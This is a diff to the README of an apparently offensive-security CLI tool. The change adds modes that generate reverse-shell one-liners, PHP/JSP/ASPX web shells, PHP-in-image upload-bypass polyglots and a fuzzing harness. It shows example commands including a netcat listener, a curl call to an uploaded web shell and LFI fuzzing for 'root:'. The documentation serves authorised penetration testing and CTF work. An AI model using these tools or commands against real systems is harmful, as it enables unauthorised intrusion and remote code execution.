@@ -147,24 +147,20 @@ Completed successfully.
 Run `poad` with no arguments for a numbered, keyboard-only menu:
 
 ```text
-[1] Path Traversal / LFI
-[2] Server-Side Template Injection
-[3] SQL Injection
-[4] Cross-Site Scripting
-[5] Command Injection
-[6] Server-Side Request Forgery
-[7] XML External Entity
-[8] Custom Payload Templates
-[9] Browse Payload Library
-[10] Presets
-[11] Settings
+[1] Payload list      - generate wordlists for Burp Intruder
+[2] Exploit script    - build a request harness for a payload list
+[3] RCE               - reverse shells, web shells, image polyglots
+[4] Browse Payload Library
+[5] Presets
+[6] Settings
 [0] Exit
 ```
 
-Each category asks only for the inputs it needs, offers defaults, validates your
-answers, previews the result, and confirms before writing a file. Type `b` at a
-prompt to go back; `Ctrl+C` exits cleanly. In a non-interactive shell POAD prints
-usage instead of blocking for input.
+**Payload list** opens the vulnerability categories (LFI, SSTI, SQLi, XSS,
+command injection, SSRF, XXE, custom). Each asks only for the inputs it needs,
+offers defaults, validates your answers, previews the result, and confirms
+before writing a file. Type `b` at a prompt to go back; `Ctrl+C` exits cleanly.
+In a non-interactive shell POAD prints usage instead of blocking for input.
 
 ---
 
@@ -186,6 +182,10 @@ usage instead of blocking for input.
 | `poad presets delete <NAME>` | Delete a preset |
 | `poad import wordlist <FILE> --category <C>` | Import a plaintext wordlist |
 | `poad import patt <DIR>` | Import a local PayloadsAllTheThings checkout |
+| `poad rce revshell --lhost <IP> --lport <PORT>` | Reverse shell one-liners |
+| `poad rce webshell --lang php\|jsp\|aspx` | Command web shell |
+| `poad rce polyglot --image png\|gif` | PHP-in-image upload-bypass file |
+| `poad exploit --url <URL-with-FUZZ> --wordlist <FILE>` | Build a request harness |
 | `poad doctor` | Check installation & library integrity |
 | `poad version` | Print version information |
 
@@ -247,6 +247,63 @@ ships no default targets and never generates metadata/internal-range endpoints.
 Inputs: `--mode {detection,file-read}`, `--file`, `--marker`. Emits **whole XML
 documents** (single-line, so still valid wordlist entries). You replace the full
 request body with one of these, rather than placing it in a single Sniper marker.
+
+---
+
+## Exploit script mode
+
+`poad exploit` writes a standalone Python 3 request harness (standard library
+only). You put a `FUZZ` marker in the URL or POST body, point it at a payload
+wordlist, and run it yourself against a single authorised target. POAD does not
+send any requests; it only writes the script.
+
+```bash
+poad exploit --url "http://TARGET/?page=FUZZ" --wordlist payloadlist.txt --match "root:" -o exploit.py
+python3 exploit.py                         # uses the baked-in defaults
+python3 exploit.py -u "http://TARGET/?x=FUZZ" -w payloadlist.txt --match "root:"
+```
+
+The harness sends one request per payload, records status/length/timing, flags
+responses containing your match string, and prints the most interesting ones
+first. Options include `-X/--method`, `-d/--data` (POST body with `FUZZ`),
+`-H/--header`, `--delay`, `--timeout`, and `--urlencode`.
+
+## RCE mode
+
+RCE artifacts are **opt-in** and separate from the payload-generator library
+(which stays shell-free). POAD writes the artifact and prints the commands you
+run yourself. It never opens a listener, delivers, or executes anything, and it
+contains no C2, persistence, or destructive behaviour.
+
+**Reverse shells** (`poad rce revshell`) produce one-liners with your
+`LHOST`/`LPORT` filled in, for bash, nc, python, perl, php, ruby, socat,
+PowerShell, and `nc.exe`:
+
+```bash
+poad rce revshell --lhost 10.10.14.5 --lport 4444 --os linux -o revshells.txt
+# POAD also prints the catcher:
+#   nc -lvnp 4444        (on Pwnbox set LHOST from: ip -4 addr show tun0)
+```
+
+**Web shells** (`poad rce webshell`) write a readable PHP, JSP, or ASPX command
+shell:
+
+```bash
+poad rce webshell --lang php --param cmd -o shell.php
+# then:  curl 'http://TARGET/uploads/shell.php?cmd=id'
+```
+
+**Image polyglots** (`poad rce polyglot`) write a file that is a valid PNG/GIF
+(passes `getimagesize()`) and also contains PHP, for upload-filter bypass. It
+only executes if the server ends up treating it as PHP (permissive double
+extension, or an LFI that includes the upload):
+
+```bash
+poad rce polyglot --image png --param cmd -o shell.php.png
+```
+
+> These are standard CTF/pentest building blocks. Use them only against systems
+> you are explicitly authorised to test.
 
 ---
 
